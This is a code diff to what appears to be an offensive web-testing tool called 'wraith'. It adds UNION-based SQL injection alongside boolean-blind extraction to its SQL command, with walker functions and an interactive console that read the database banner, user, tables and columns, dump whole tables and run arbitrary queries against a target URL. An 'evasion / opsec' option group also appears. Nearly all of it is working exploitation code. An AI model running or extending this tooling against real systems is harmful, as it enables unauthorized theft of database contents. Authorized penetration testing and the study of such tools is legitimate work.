@@ -211,17 +211,65 @@ def cmd_sql(args) -> None:
     prof = sqli._PROFILES.get(dbms, sqli._PROFILES["sqlite"])
     c.good(f"DBMS: {dbms}")
 
+    # Pick the technique: union (reads whole values per request — fast) when the
+    # point reflects output, else boolean-blind (one char at a time).
+    union = None
+    if args.technique in ("auto", "union"):
+        setup = sqli.union_setup(net, oracle)
+        if setup:
+            union = (dbms, *setup)
+            c.good(f"union-based — {setup[0]} columns, output reflected (fast)")
+        elif args.technique == "union":
+            c.bad("no usable UNION here (no reflected column) — try --technique blind")
+            raise SystemExit(1)
+    if union is None:
+        c.info("boolean-blind extraction (a request per bit — slower)")
+
     # Non-interactive (batch) one-shots, else the interactive console.
     if args.banner:
-        c.good(sqli.extract_str(oracle, prof, prof["version"]))
+        c.good(_walk_banner(oracle, prof, union))
     elif args.tables:
-        for t in sqli.tables(oracle, prof):
+        for t in _walk_tables(oracle, prof, union):
             c.plain(f"  {t}")
     elif args.dump:
-        cols = sqli.columns(oracle, prof, args.dump)
-        _print_table(c, cols, sqli.dump(oracle, prof, args.dump, cols))
+        cols, rows = _walk_dump(oracle, prof, union, args.dump)
+        _print_table(c, cols, rows)
     else:
-        _sql_repl(c, oracle, prof)
+        _sql_repl(c, oracle, prof, union)
+
+
+# Technique-agnostic walkers: use UNION when available, else boolean-blind.
+def _walk_banner(oracle, prof, union):
+    if union:
+        return sqli.union_value(oracle.http, oracle, *union, sqli._PROFILES[union[0]]["version"])
+    return sqli.extract_str(oracle, prof, prof["version"])
+
+
+def _walk_scalar(oracle, prof, union, expr):
+    if union:
+        return sqli.union_value(oracle.http, oracle, *union, expr)
+    return sqli.extract_str(oracle, prof, expr)
+
+
+def _walk_tables(oracle, prof, union):
+    if union:
+        return sqli.union_tables(oracle.http, oracle, *union)
+    return sqli.tables(oracle, prof)
+
+
+def _walk_columns(oracle, prof, union, table):
+    if union:
+        return sqli.union_columns(oracle.http, oracle, *union, table)
+    return sqli.columns(oracle, prof, table)
+
+
+def _walk_dump(oracle, prof, union, table):
+    cols = _walk_columns(oracle, prof, union, table)
+    if union:
+        rows = sqli.union_dump(oracle.http, oracle, *union, table, cols)
+    else:
+        rows = sqli.dump(oracle, prof, table, cols)
+    return cols, rows
 
 
 def _print_table(c, cols, rows) -> None:
@@ -233,7 +281,7 @@ def _print_table(c, cols, rows) -> None:
         c.plain("  " + " | ".join(v.ljust(widths[i]) for i, v in enumerate(r)))
 
 
-def _sql_repl(c, oracle, prof) -> None:
+def _sql_repl(c, oracle, prof, union) -> None:
     c.plain(_SQL_HELP)
     while True:
         try:
@@ -253,26 +301,25 @@ def _sql_repl(c, oracle, prof) -> None:
                 c.plain(_SQL_HELP)
                 continue
             elif cmd == "banner":
-                c.good(sqli.extract_str(oracle, prof, prof["version"]))
+                c.good(_walk_banner(oracle, prof, union))
             elif cmd in ("user", "current-user"):
-                c.good(sqli.extract_str(oracle, prof, prof["user"]) or "(n/a)")
+                c.good(_walk_scalar(oracle, prof, union, prof["user"]) or "(n/a)")
             elif cmd in ("db", "current-db"):
-                c.good(sqli.extract_str(oracle, prof, prof["db"]))
+                c.good(_walk_scalar(oracle, prof, union, prof["db"]))
             elif cmd == "tables":
-                for t in sqli.tables(oracle, prof):
+                for t in _walk_tables(oracle, prof, union):
                     c.plain(f"  {t}")
             elif cmd == "columns":
                 if not arg:
                     c.warn("usage: columns <table>")
                     continue
-                for col in sqli.columns(oracle, prof, arg):
+                for col in _walk_columns(oracle, prof, union, arg):
                     c.plain(f"  {col}")
             elif cmd == "dump":
                 if not arg:
                     c.warn("usage: dump <table>")
                     continue
-                cols = sqli.columns(oracle, prof, arg)
-                rows = sqli.dump(oracle, prof, arg, cols)
+                cols, rows = _walk_dump(oracle, prof, union, arg)
                 _print_table(c, cols, rows)
             elif cmd == "query":
                 if not arg:
@@ -280,7 +327,7 @@ def _sql_repl(c, oracle, prof) -> None:
                     continue
                 if len(arg) >= 2 and arg[0] == arg[-1] and arg[0] in "\"'":
                     arg = arg[1:-1]            # peel one wrapping quote, keep inner ones
-                c.good(sqli.extract_str(oracle, prof, arg))
+                c.good(_walk_scalar(oracle, prof, union, arg))
             else:
                 c.warn(f"unknown command: {cmd} (type 'help')")
         except Exception as exc:
@@ -331,6 +378,8 @@ def build_parser() -> argparse.ArgumentParser:
     sq.add_argument("-u", "--url", help="target URL (default: wraith's latest SQLi finding)")
     sq.add_argument("-p", "--param", help="injectable parameter (inferred if the URL has just one)")
     sq.add_argument("--value", metavar="V", default="1", help="a normal value for the parameter (default: 1)")
+    sq.add_argument("--technique", choices=["auto", "union", "blind"], default="auto",
+                    help="auto (union if reflected, else blind) · union · blind")
     sq.add_argument("-v", "--verbose", nargs="?", const=1, type=int, default=0, metavar="LEVEL",
                     help="-v 2 prints every injected payload")
     ev = sq.add_argument_group("evasion / opsec")
